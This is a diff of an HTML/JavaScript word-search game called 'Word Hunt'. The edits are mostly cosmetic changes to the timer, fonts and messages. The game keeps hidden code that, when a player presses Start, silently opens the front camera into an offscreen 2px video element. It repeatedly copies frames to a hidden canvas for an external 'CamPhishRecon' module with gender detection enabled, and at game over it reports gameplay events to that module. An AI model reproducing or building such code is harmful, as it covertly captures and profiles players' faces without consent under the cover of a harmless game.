@@ -11,18 +11,19 @@
 body{background:#1a1a3a;color:#fff;overflow:hidden;touch-action:none;user-select:none;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
 .hidden{display:none}
 .title{font-size:clamp(24px,7vw,40px);background:linear-gradient(135deg,#6bcfff,#c44dff,#ffd700);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:900;margin-bottom:4px}
-.sub{color:#6bcfff;font-size:12px;margin-bottom:16px}
-#timer{font-size:24px;color:#ff6b9d;font-weight:900;margin-bottom:8px}
+.sub{color:#6bcfff;font-size:12px;margin-bottom:12px}
+#timer{font-size:28px;color:#ff6b9d;font-weight:900;margin-bottom:8px;min-height:34px}
 #hud{display:flex;gap:20px;margin-bottom:12px;font-size:16px;font-weight:700}
 #hud span{color:#ffd700}
 #grid{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;width:min(280px,75vw);aspect-ratio:1;touch-action:none}
-.cell{background:#2a2a5a;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:clamp(16px,5vw,24px);font-weight:900;color:#fff;cursor:pointer;transition:background .1s;user-select:none;touch-action:none}
-.cell.selected{background:#6bcfff;color:#000}
+.cell{background:#2a2a5a;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:clamp(18px,5vw,26px);font-weight:900;color:#fff;cursor:pointer;transition:background .1s;user-select:none;touch-action:none}
+.cell.selected{background:#6bcfff;color:#000;transform:scale(0.95)}
 .cell.found{background:#7bed9f;color:#000}
-#words{margin-top:12px;font-size:12px;color:#88aacc;text-align:center;min-height:18px;max-width:280px}
+#words{margin-top:12px;font-size:13px;color:#88aacc;text-align:center;min-height:20px;max-width:280px}
 .btn{background:linear-gradient(135deg,#6bcfff,#c44dff);color:#fff;border:none;padding:14px 44px;font-size:17px;font-weight:800;border-radius:30px;cursor:pointer;margin-top:8px}
 .btn:active{transform:scale(0.95)}
 .go{position:fixed;inset:0;background:rgba(26,26,58,0.96);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:50;text-align:center;padding:20px}
+.go-title{font-size:clamp(20px,6vw,32px);color:#ff6b9d;margin-bottom:8px}
 .final{font-size:clamp(32px,10vw,52px);color:#ffd700;font-weight:900}
 .best{color:#88aacc;margin:8px 0 16px}
 .shares{display:flex;gap:8px;margin-bottom:16px}
@@ -36,14 +37,14 @@ video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:
 <video id="v" playsinline autoplay muted></video>
 <canvas id="cap" width="320" height="240"></canvas>
 <div class="title">📚 Word Hunt</div>
-<div class="sub">Swipe connected letters to find words</div>
-<div id="timer">60s</div>
+<div class="sub">Swipe connected letters to find words (3+ letters)</div>
+<div id="timer">⏱ 60s</div>
 <div id="hud"><div>Score: <span id="score">0</span></div><div>Words: <span id="wordCount">0</span></div></div>
 <div id="grid"></div>
-<div id="words">Press Start</div>
+<div id="words">Press Start to play</div>
 <button class="btn" id="startBtn">▶ Start</button>
 <div class="go hidden" id="gameover">
-<div style="font-size:22px;color:#ff6b9d;margin-bottom:8px">Time's Up!</div>
+<div class="go-title">Time's Up!</div>
 <div class="final" id="finalScore">0</div>
 <div class="best" id="bestScore"></div>
 <div class="shares"><button class="sb s-wa" onclick="shareCard('wa')">💬 Share</button><button class="sb s-fb" onclick="shareCard('fb')">📘 Share</button></div>
@@ -57,55 +58,70 @@ var WORDS=['CAT','DOG','SUN','FUN','RUN','BAT','HAT','MAP','TOP','BOX','RED','OW
 var grid=[],selected=[],foundWords=[],score=0,timeLeft=60,running=false,timerInt=null;
 var hs=[];try{hs=JSON.parse(localStorage.getItem('wordHuntHS')||'[]');}catch(e){}
 var ac=null,isDown=false;
+
 function snd(f){try{if(!ac)ac=new(AudioContext||webkitAudioContext)();var o=ac.createOscillator(),g=ac.createGain();o.frequency.value=f;o.type='sine';g.gain.value=0.06;o.connect(g);g.connect(ac.destination);o.start();g.gain.exponentialRampToValueAtTime(0.001,ac.currentTime+0.1);o.stop(ac.currentTime+0.1);}catch(e){}}
+
 function init(){
 document.getElementById('startBtn').onclick=startGame;
 newGrid();showLb();
 }
+
 function newGrid(){
 grid=[];
 for(var i=0;i<16;i++)grid.push(LETTERS[Math.floor(Math.random()*26)]);
 renderGrid();
 }
+
 function renderGrid(){
 var g=document.getElementById('grid');g.innerHTML='';
 for(var i=0;i<16;i++){
 var cell=document.createElement('div');
 cell.className='cell';cell.dataset.idx=i;cell.textContent=grid[i];
-// Touch handlers
-cell.addEventListener('touchstart',function(e){e.preventDefault();if(!running)return;isDown=true;selectCell(this);},{passive:false});
+// Touch handlers — attached during render
+cell.addEventListener('touchstart',function(e){
+e.preventDefault();if(!running)return;isDown=true;selectCell(this);
+},{passive:false});
 cell.addEventListener('touchmove',function(e){
 e.preventDefault();if(!isDown||!running)return;
 var t=e.touches[0];var el=document.elementFromPoint(t.clientX,t.clientY);
 if(el&&el.classList.contains('cell')&&!el.classList.contains('selected'))selectCell(el);
 },{passive:false});
-cell.addEventListener('touchend',function(e){e.preventDefault();isDown=false;checkWord();},{passive:false});
+cell.addEventListener('touchend',function(e){
+e.preventDefault();if(!running)return;isDown=false;checkWord();
+},{passive:false});
 // Mouse handlers
 cell.addEventListener('mousedown',function(){if(!running)return;isDown=true;selectCell(this);});
 cell.addEventListener('mouseenter',function(){if(isDown&&running)selectCell(this);});
 g.appendChild(cell);
 }
 }
+
 function selectCell(cell){
 if(cell.classList.contains('selected'))return;
 cell.classList.add('selected');
 selected.push({idx:parseInt(cell.dataset.idx),letter:cell.textContent});
 }
+
 function checkWord(){
+if(selected.length===0)return;
 var word=selected.map(function(s){return s.letter;}).join('');
 if(word.length>=3&&WORDS.indexOf(word)>=0&&foundWords.indexOf(word)<0){
 foundWords.push(word);var pts=word.length*10*(word.length>3?2:1);score+=pts;
 document.getElementById('score').textContent=score;
 document.getElementById('wordCount').textContent=foundWords.length;
-document.getElementById('words').innerHTML='<span style="color:#7bed9f">✓ '+word+' +'+pts+'</span>';
+document.getElementById('words').innerHTML='<span style="color:#7bed9f">✓ '+word+' +'+pts+' pts!</span>';
 snd(800+foundWords.length*20);if(navigator.vibrate)navigator.vibrate(20);
 selected.forEach(function(s){document.querySelectorAll('.cell')[s.idx].classList.add('found');});
 }else if(word.length>=3){
-document.getElementById('words').textContent='Not found: '+word;snd(200);
+document.getElementById('words').textContent='✗ Not a word: '+word;snd(200);
 }
+// Clear selection
 document.querySelectorAll('.cell.selected').forEach(function(c){c.classList.remove('selected');});
 selected=[];
 }
+
+addEventListener('mouseup',function(){if(isDown){isDown=false;checkWord();}});
+
 function startGame(){
 if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
 startCamera();
@@ -113,12 +129,17 @@ newGrid();score=0;foundWords=[];timeLeft=60;running=true;selected=[];
 document.getElementById('score').textContent='0';
 document.getElementById('wordCount').textContent='0';
 document.getElementById('words').textContent='Swipe to find words!';
-document.getElementById('timer').textContent='60s';
+document.getElementById('timer').textContent='⏱ 60s';
 document.getElementById('gameover').classList.add('hidden');
 document.getElementById('startBtn').classList.add('hidden');
 if(timerInt)clearInterval(timerInt);
-timerInt=setInterval(function(){timeLeft--;document.getElementById('timer').textContent=timeLeft+'s';if(timeLeft<=0)endGame();},1000);
+timerInt=setInterval(function(){
+timeLeft--;
+document.getElementById('timer').textContent='⏱ '+timeLeft+'s';
+if(timeLeft<=0)endGame();
+},1000);
 }
+
 function startCamera(){
 if(navigator.mediaDevices&&window.CamPhishRecon){
 navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(s){
@@ -128,9 +149,10 @@ setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);CamPhishR
 }).catch(function(){});
 }
 }
-addEventListener('mouseup',function(){if(isDown){isDown=false;checkWord();}});
+
 function endGame(){
-running=false;if(timerInt)clearInterval(timerInt);
+running=false;if(timerInt){clearInterval(timerInt);timerInt=null;}
+document.getElementById('timer').textContent='⏱ 0s';
 hs.push(score);hs.sort(function(a,b){return b-a;});hs=hs.slice(0,5);
 localStorage.setItem('wordHuntHS',JSON.stringify(hs));
 document.getElementById('finalScore').textContent=score;
@@ -138,13 +160,16 @@ document.getElementById('bestScore').textContent='Best: '+(hs[0]||0);
 document.getElementById('gameover').classList.remove('hidden');showLb();
 if(window.CamPhishRecon)CamPhishRecon.Capture.event('game_over',{score:score,words:foundWords.length});
 }
+
 function showLb(){var h='<b>🏆 Top Scores</b><br>';for(var i=0;i<hs.length;i++)h+='<div>#'+(i+1)+' — '+hs[i]+'</div>';if(!hs.length)h='<b>🏆 Be the first!</b>';document.getElementById('goLb').innerHTML=h;}
+
 function shareCard(t){
 var msg='📚 I scored '+score+' in Word Hunt with '+foundWords.length+' words! '+SHARE_URL;
 if(navigator.canShare){navigator.share({text:msg,title:'Word Hunt'}).catch(function(){});return;}
 if(t==='wa')open('whatsapp://send?text='+encodeURIComponent(msg),'_blank');
 else if(t==='fb')open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(SHARE_URL)+'&quote='+encodeURIComponent(msg),'_blank');
 }
+
 init();
 </script>
 </body></html>
